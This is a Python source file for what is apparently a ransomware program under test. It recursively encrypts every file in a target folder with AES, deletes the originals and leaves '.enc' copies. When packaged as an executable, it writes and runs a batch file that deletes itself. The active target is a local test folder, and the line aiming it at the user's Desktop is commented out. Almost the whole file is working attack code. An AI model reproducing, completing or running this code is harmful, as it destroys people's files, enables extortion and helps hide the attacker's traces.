from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import os
import sys
import subprocess

def encrypt_data(data, key):
    iv = get_random_bytes(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(pad(data, AES.block_size))

def encrypt_file_inplace(file_path, key):
    try:
        with open(file_path, 'rb') as f:
            file_data = f.read()
        encrypted_data = encrypt_data(file_data, key)
        encrypted_file_path = file_path + '.enc'  # Add .enc extension to the encrypted file
        with open(encrypted_file_path, 'wb') as f:
            f.write(encrypted_data)
        os.remove(file_path)  # Optionally remove the original file
    except Exception as e:
        print(f"Failed to encrypt: {file_path}. Error: {str(e)}")

def traverse_and_encrypt(start_path, key):
    for dirpath, dirnames, filenames in os.walk(start_path):
        for filename in filenames:
            file_path = os.path.join(dirpath, filename)
            if not file_path.endswith('.enc'):  # Avoid re-encrypting already encrypted files
                encrypt_file_inplace(file_path, key)

def create_deletion_script():
    # Create a batch script to delete the executable
    script_path = os.path.join(os.path.dirname(sys.executable), "delete_self.bat")
    with open(script_path, 'w') as bat_file:
        bat_file.write(f"""
@echo off
timeout 1
del "{sys.executable}"
del "%~f0"
""")
    # Run the batch file
    subprocess.Popen(script_path, shell=True)

if __name__ == "__main__":
    key = bytes.fromhex('Put the key here')  # 32-byte AES key
    #desktop_path = os.path.join(os.environ['USERPROFILE'], 'Desktop')  # Path to Desktop
    desktop_path = r"C:\Users\dell\Desktop\Ransomwaree\Test File"
    traverse_and_encrypt(desktop_path, key)
    print("Encryption completed successfully.")

    # Check if running as an executable and trigger self-deletion
    if getattr(sys, 'frozen', False):
        print("Running in a PyInstaller bundle; preparing to self-delete.")
        create_deletion_script()
    else:
        print("Running in a normal Python environment; no self-deletion.")
